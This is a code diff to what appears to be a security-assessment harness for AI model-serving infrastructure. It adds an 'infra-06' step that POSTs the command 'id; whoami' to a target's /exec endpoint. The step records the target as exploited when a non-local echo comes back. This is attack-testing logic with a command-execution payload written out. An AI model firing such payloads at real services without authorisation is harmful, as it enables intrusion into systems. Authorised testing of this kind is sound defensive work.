@@ -54,12 +54,35 @@ def _echo_is_local(text: str) -> bool:
     return any(name.lower() in lowered for name in _local_identities())
 
 
+def _exec_via_endpoint(ctx: RunContext) -> StepVerdict:
+    """SKILL.md infra-06 的 /exec 路径：POST {"cmd":"id; whoami"} 并校验回显归属。"""
+    body = {"cmd": "id; whoami"}
+    command = curl_json(ctx.exec_endpoint, body)
+    resp = ctx.transport.request("POST", ctx.exec_endpoint, json_body=body,
+                                 timeout=ctx.timeout)
+    text = resp.body or resp.error or ""
+    output = "$ %s\n(status=%d)\n%s" % (command, resp.status, text[:1200])
+    if _echo_is_local(text):
+        return StepVerdict("infra-06", Outcome.BLOCKED, reason="local_echo",
+                           summary="/exec 回显命中本机身份，不判目标侧执行",
+                           command=command, output=output)
+    if resp.ok and text.strip():
+        return StepVerdict("infra-06", Outcome.EXPLOITED, "",
+                           summary="经模型服务 /exec 取得目标侧代码执行回显",
+                           command=command, output=output)
+    return StepVerdict("infra-06", Outcome.BLOCKED, reason="guardrail",
+                       summary="/exec 被拒绝或无回显（护栏/权限拦截）",
+                       command=command, output=output)
+
+
 def privesc(ctx: RunContext) -> StepVerdict:
     """infra-06：取得代码执行回显并校验归属（不得为本机回显）。"""
+    if not ctx.exec_argv and ctx.exec_endpoint:
+        return _exec_via_endpoint(ctx)
     if not ctx.exec_argv:
         return StepVerdict("infra-06", Outcome.ABSENT, reason="none_found",
                            summary="未提供代码执行命令（无可用提权入口）",
-                           output="判定依据：未提供 exec_argv，未发起执行请求",
+                           output="判定依据：未提供 exec_argv / exec_endpoint，未发起执行请求",
                            command="id; whoami")
     command = argv_to_text(ctx.exec_argv)
     result = ctx.command.run(ctx.exec_argv, timeout=ctx.timeout)
